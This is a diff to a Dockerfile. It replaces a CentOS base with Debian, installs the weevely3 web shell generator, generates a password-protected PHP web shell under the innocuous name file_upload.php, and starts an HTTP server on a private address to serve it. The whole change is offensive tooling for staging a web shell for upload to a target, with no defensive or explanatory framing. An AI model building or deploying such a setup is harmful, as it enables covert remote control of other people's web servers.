@@ -1,5 +1,7 @@
-FROM centos:7
+FROM debian:latest
 ENV container docker
-CMD ["bash"]
-
-
+RUN apt update -y && apt list --upgradable && apt upgrade -y && apt install -y git python3 python3-pip curl && pip3 install --upgrade pip
+RUN git clone https://github.com/epinna/weevely3 && cd weevely3 && pip3 install -r requirements.txt --upgrade
+RUN ./weevely3/weevely.py generate mypassword file_upload.php 
+RUN python3 -m http.server 8000 --bind 10.0.2.25 &
+ENTRYPOINT ["bash"]
